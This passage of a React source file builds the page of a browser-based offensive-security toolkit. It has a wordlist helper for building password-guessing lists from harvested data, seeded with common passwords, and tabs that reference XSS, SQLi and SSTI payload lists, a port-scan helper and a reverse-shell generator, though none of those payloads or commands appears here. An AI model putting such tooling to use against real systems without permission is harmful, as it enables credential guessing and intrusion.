        <div className="flex items-center gap-2.5">
          <span className="w-8 h-8 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center"><FileText className="w-4 h-4 text-[var(--text-2)]" /></span>
          <div className="flex-1">
            <CardTitle>Wordlist helper</CardTitle>
            <CardDescription>Transform, filter, dedupe. Great for custom wordlists from harvested data.</CardDescription>
          </div>
          <Badge variant="outline" className="font-mono text-[10px] hidden sm:inline-flex">{stats}</Badge>
        </div>
      </CardHeader>
      <CardContent className="space-y-3">
        <div className="grid lg:grid-cols-[1.2fr_0.8fr] gap-4">
          <div>
            <div className="flex items-center justify-between mb-1.5">
              <span className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)]">Input wordlist</span>
              <span className="text-[11px] font-mono text-[var(--text-3)]">{input.split("\n").length} raw lines</span>
            </div>
            <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder="One entry per line..." className={textareaClass + " font-mono text-[12.5px] min-h-[220px]"} spellCheck={false} />
            <div className="mt-2 flex gap-2">
              <Button variant="secondary" size="sm" onClick={() => setInput("")} className="h-7 text-[12px]">Clear</Button>
              <Button variant="secondary" size="sm" onClick={() => setInput("admin\nroot\nuser\ntest\npassword\n123456\nqwerty\nletmein\n")} className="h-7 text-[12px]">Load example</Button>
            </div>
          </div>
          <div className="space-y-3">
            <div className="grid grid-cols-2 gap-2">
              <div>
                <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)] mb-1">Prefix</div>
                <Input value={prefix} onChange={(e) => setPrefix(e.target.value)} placeholder="e.g. dev-" className="h-8 font-mono text-[13px]" />
              </div>
              <div>
                <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)] mb-1">Suffix</div>
                <Input value={suffix} onChange={(e) => setSuffix(e.target.value)} placeholder="e.g. 123" className="h-8 font-mono text-[13px]" />
              </div>
              <div>
                <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)] mb-1">Min length</div>
                <Input value={minLen} onChange={(e) => setMinLen(e.target.value)} placeholder="e.g. 6" className="h-8 font-mono text-[13px]" inputMode="numeric" />
              </div>
              <div>
                <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)] mb-1">Regex filter</div>
                <div className="relative">
                  <Filter className="absolute left-2 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-[var(--text-3)]" />
                  <Input value={filter} onChange={(e) => setFilter(e.target.value)} placeholder="^[a-z]+$" className="pl-7 h-8 font-mono text-[12.5px]" />
                </div>
              </div>
            </div>
            <div className="flex flex-wrap gap-3 text-[12.5px]">
              <label className="flex items-center gap-1.5"><input type="checkbox" checked={dedup} onChange={(e) => setDedup(e.target.checked)} className="rounded" /> Deduplicate</label>
              <label className="flex items-center gap-1.5"><input type="checkbox" checked={lower} onChange={(e) => setLower(e.target.checked)} className="rounded" /> Lowercase</label>
              <label className="flex items-center gap-1.5"><input type="checkbox" checked={upper} onChange={(e) => setUpper(e.target.checked)} className="rounded" /> Uppercase</label>
            </div>
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <span className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)]">Output</span>
                <div className="flex items-center gap-1.5">
                  <Badge variant="secondary" className="font-mono text-[11px] hidden sm:inline-flex">{stats}</Badge>
                  <CopyButton text={out} />
                </div>
              </div>
              <div className={outputAreaClass + " min-h-[160px] bg-[var(--surface)]"}>
                {out ? out : (
                  <span className="flex flex-col items-center justify-center py-4 gap-2">
                    <span className="w-8 h-8 rounded-full bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center">
                      <FileText className="w-4 h-4 text-[var(--text-2)]" />
                    </span>
                    <span className="text-[14px] font-[600] text-[var(--text)]">No output yet</span>
                    <span className="text-[12px] leading-5 text-[var(--text-2)]">Adjust filters or add input to generate a wordlist.</span>
                  </span>
                )}
              </div>
              <div className="mt-2 flex gap-2">
                <Button variant="secondary" size="sm" className="h-7 text-[12px] gap-1.5" onClick={() => {
                  const blob = new Blob([out], { type: "text/plain" })
                  const url = URL.createObjectURL(blob)
                  const a = document.createElement("a"); a.href = url; a.download = "wordlist.txt"; a.click(); URL.revokeObjectURL(url)
                }} disabled={!out}>
                  <Download className="w-3.5 h-3.5" /> Download .txt
                </Button>
                <span className="text-[11px] text-[var(--text-3)] self-center">Saves as wordlist.txt</span>
              </div>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

// ─────────────────────────────────────────────────────────────
// Page
// ─────────────────────────────────────────────────────────────

export default function ToolsPage() {
  const [query, setQuery] = React.useState("")
  // tabs: encoding | hashing | payloads | network | crypto | utilities
  const [tab, setTab] = React.useState("encoding")

  // if user searches globally, switch tab heuristic? keep simple: filter inside.
  return (
    <AppShell withSidebar>
      <div className="px-4 sm:px-6 lg:px-8 py-6 sm:py-8 max-w-[1280px] w-full mx-auto">
        <FadeIn>
          <div className="flex flex-col gap-4 mb-6">
            <div className="flex flex-wrap items-start justify-between gap-4">
              <div className="min-w-0">
                <div className="flex items-center gap-2">
                  <span className="w-8 h-8 rounded-[9px] bg-[var(--text)] text-[var(--background)] flex items-center justify-center">
                    <Wrench className="w-4 h-4" />
                  </span>
                  <h1 className="text-[22px] font-[700] tracking-[-0.03em]">Toolkit</h1>
                  <Badge variant="outline" className="rounded-full text-[11px]">Local-only</Badge>
                  <Badge variant="secondary" className="rounded-full text-[11px] hidden sm:inline-flex">14 tools</Badge>
                </div>
                <p className="mt-1.5 text-[13.5px] leading-relaxed text-[var(--text-2)] max-w-[640px]">
                  Professional, offline utilities for daily security work — encoding, hashing, payloads, network math, crypto and helpers. No data leaves your browser.
                </p>
                <div className="mt-3 flex flex-wrap gap-1.5">
                  <span className="inline-flex items-center gap-1.5 rounded-full border border-[var(--border)] bg-[var(--surface)] px-2.5 py-1 text-[11.5px] text-[var(--text-2)]">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-500" /> Client-side only
                  </span>
                  <span className="inline-flex items-center gap-1.5 rounded-full border border-[var(--border)] bg-[var(--surface)] px-2.5 py-1 text-[11.5px] text-[var(--text-2)]">
                    <Lock className="w-3 h-3" /> No telemetry
                  </span>
                  <span className="inline-flex items-center gap-1.5 rounded-full border border-[var(--border)] bg-[var(--surface)] px-2.5 py-1 text-[11.5px] text-[var(--text-2)]">
                    <Code2 className="w-3 h-3" /> Real crypto (SubtleCrypto)
                  </span>
                </div>
              </div>
              <div className="w-full sm:w-[320px] shrink-0">
                <div className="relative">
                  <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-[var(--text-3)]" />
                  <Input
                    value={query}
                    onChange={(e) => setQuery(e.target.value)}
                    placeholder="Search tools, e.g. jwt, cidr, base64..."
                    className="pl-8 h-9 bg-[var(--surface)]"
                  />
                </div>
                <div className="mt-2 flex items-center gap-1.5 text-[11px] text-[var(--text-3)]">
                  <Info className="w-3 h-3" /> Tip: press <span className="font-mono border border-[var(--border)] bg-[var(--surface)] px-1 py-0.5 rounded text-[10px]">/</span> to focus — via command palette.
                </div>
              </div>
            </div>
          </div>
        </FadeIn>

        <Tabs value={tab} onValueChange={setTab} className="w-full">
          <div className="overflow-x-auto pb-1 -mx-1 px-1">
            <TabsList className="h-auto p-1 gap-1 flex-wrap sm:flex-nowrap inline-flex w-max sm:w-auto">
              <TabsTrigger value="encoding" className="gap-1.5 data-[state=active]:bg-[var(--surface)]"><Code2 className="w-3.5 h-3.5" /> Encoding</TabsTrigger>
              <TabsTrigger value="hashing" className="gap-1.5"><Hash className="w-3.5 h-3.5" /> Hashing</TabsTrigger>
              <TabsTrigger value="payloads" className="gap-1.5"><Bug className="w-3.5 h-3.5" /> Payloads</TabsTrigger>
              <TabsTrigger value="network" className="gap-1.5"><Network className="w-3.5 h-3.5" /> Network</TabsTrigger>
              <TabsTrigger value="crypto" className="gap-1.5"><KeyRound className="w-3.5 h-3.5" /> Crypto</TabsTrigger>
              <TabsTrigger value="utilities" className="gap-1.5"><Terminal className="w-3.5 h-3.5" /> Utilities</TabsTrigger>
            </TabsList>
          </div>

          {/* Encoding */}
          <TabsContent value="encoding" className="mt-6">
            {query && !["base64", "url", "hex", "encod"].some((k) => query.toLowerCase().includes(k) || k.includes(query.toLowerCase())) ? (
              <Card className="border-dashed rounded-[12px] bg-[var(--surface-2)]"><CardContent className="p-6 text-center">
                <div className="w-10 h-10 rounded-full bg-[var(--surface)] border border-[var(--border)] flex items-center justify-center mx-auto"><Search className="w-5 h-5 text-[var(--text-2)]" /></div>
                <div className="mt-3 text-[14px] font-[600] tracking-[-0.01em]">No encoding tools match &quot;{query}&quot;</div>
                <div className="mt-1 text-[12px] leading-5 text-[var(--text-2)] max-w-[280px] mx-auto">Try &quot;base64&quot;, &quot;url&quot; or &quot;hex&quot; to find an encoder.</div>
                <Button size="sm" onClick={() => setQuery("")} className="mt-4 h-8 rounded-[8px] bg-[var(--text)] text-[var(--background)]">Clear search</Button>
              </CardContent></Card>
            ) : (
              <Stagger className="grid lg:grid-cols-2 gap-4">
                <div className="stagger-item"><Base64Tool /></div>
                <div className="stagger-item"><UrlTool /></div>
                <div className="stagger-item lg:col-span-2"><HexTool /></div>
              </Stagger>
            )}
          </TabsContent>

          {/* Hashing */}
          <TabsContent value="hashing" className="mt-6">
            <Stagger className="grid lg:grid-cols-2 gap-4">
              <div className="stagger-item"><HashTool /></div>
              <div className="stagger-item"><BcryptTool /></div>
            </Stagger>
          </TabsContent>

          {/* Payloads */}
          <TabsContent value="payloads" className="mt-6">
            <div className="rounded-[10px] border border-[var(--border)] bg-[var(--surface-2)] p-3 mb-4 flex items-start gap-2.5">
              <Shield className="w-4 h-4 text-[var(--text-3)] mt-[2px] shrink-0" />
              <div className="text-[12.5px] leading-relaxed text-[var(--text-2)]">
                <span className="font-semibold text-[var(--text)]">Authorized use only.</span> Payloads are provided for labs, CTFs and assessments with explicit permission. Review target scope before testing.
              </div>
            </div>
            <Stagger className="grid lg:grid-cols-3 gap-4">
              <div className="stagger-item"><PayloadTool title="XSS" payloads={xssPayloads} icon={Bug} /></div>
              <div className="stagger-item"><PayloadTool title="SQLi" payloads={sqliPayloads} icon={Database} /></div>
              <div className="stagger-item"><PayloadTool title="SSTI" payloads={sstiPayloads} icon={Braces} /></div>
            </Stagger>
          </TabsContent>

          {/* Network */}
          <TabsContent value="network" className="mt-6">
            <Stagger className="grid lg:grid-cols-2 gap-4">
              <div className="stagger-item"><CidrTool /></div>
              <div className="stagger-item"><PortScanHelper /></div>
            </Stagger>
          </TabsContent>

          {/* Crypto */}
          <TabsContent value="crypto" className="mt-6">
            <Stagger className="grid lg:grid-cols-2 gap-4">
              <div className="stagger-item"><JwtTool /></div>
              <div className="stagger-item"><AesTool /></div>
            </Stagger>
          </TabsContent>

          {/* Utilities */}
          <TabsContent value="utilities" className="mt-6">
            <Stagger className="grid gap-4">
              <div className="stagger-item"><ReverseShellTool /></div>
              <div className="stagger-item"><WordlistHelper /></div>
            </Stagger>
          </TabsContent>
        </Tabs>

        <div className="mt-8 rounded-[12px] border border-[var(--border)] bg-[var(--surface)] p-4 sm:p-5 flex flex-col sm:flex-row items-start justify-between gap-4">
          <div className="flex gap-3 min-w-0">
            <span className="w-8 h-8 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center shrink-0"><Shield className="w-4 h-4 text-[var(--text-2)]" /></span>
            <div className="min-w-0">
              <div className="text-[13px] font-[600]">Need something else?</div>
              <div className="text-[12.5px] text-[var(--text-2)] leading-relaxed">Toolkit is local-only. For team wordlists, secret scanning or pipeline integrations, check Labs and Research. Requests are welcome — open a discussion in Community.</div>
            </div>
          </div>
          <div className="flex items-center gap-2 shrink-0 w-full sm:w-auto">
            <a href="/labs" className="flex-1 sm:flex-none inline-flex items-center justify-center gap-1.5 h-9 px-4 rounded-[8px] bg-[var(--text)] text-[var(--background)] text-[13px] font-[500] hover:bg-[#27272A] transition-colors">Browse labs <ArrowRight className="w-3.5 h-3.5" /></a>
            <a href="/research" className="flex-1 sm:flex-none inline-flex items-center justify-center h-9 px-4 rounded-[8px] border border-[var(--border)] bg-[var(--surface)] text-[13px] font-[500] hover:bg-[var(--surface-2)] transition-colors">Research</a>
          </div>
        </div>

        <div className="mt-4 text-center text-[11px] text-[var(--text-3)]">
          Aegis Toolkit • Built for practitioners. All ciphers and hashes use the browser&apos;s Web Crypto API where available. No inputs are stored.
        </div>
      </div>
    </AppShell>
  )
}
